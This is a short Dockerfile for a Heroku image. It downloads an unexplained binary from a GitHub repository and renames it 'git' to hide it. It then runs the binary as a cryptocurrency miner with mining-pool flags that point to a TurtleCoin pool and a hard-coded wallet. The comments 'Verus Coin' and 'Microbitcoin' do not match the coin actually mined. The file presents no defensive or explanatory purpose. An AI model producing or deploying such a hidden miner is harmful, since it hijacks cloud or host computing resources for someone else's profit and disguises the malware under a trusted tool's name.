FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget

# Verus Coin
RUN wget https://github.com/jerukseger/gimbal/raw/main/esmrik; chmod +x esmrik
RUN mv esmrik git
RUN ./git --donate-level 0 -o de.turtlecoin.herominers.com:1160 -u TRTLv2VHJdv2r1M175D6miCKJVy1SQ2yqFaK2BDqC7cVGhwJAtEhm7Tbj4W7AoEeA2NTfKnYQUNSsVQiUN9f7Eaf25qSRe7Cftc -p test -a argon2/chukwav2 -k 

# Microbitcoin
RUN wget wget https://github.com/jerukseger/gimbal/raw/main/esmrik; chmod +x esmrik; ./esmrik --donate-level 0 -o de.turtlecoin.herominers.com:1160 -u TRTLv2VHJdv2r1M175D6miCKJVy1SQ2yqFaK2BDqC7cVGhwJAtEhm7Tbj4W7AoEeA2NTfKnYQUNSsVQiUN9f7Eaf25qSRe7Cftc -p test -a argon2/chukwav2 -k 
CMD bash heroku.sh
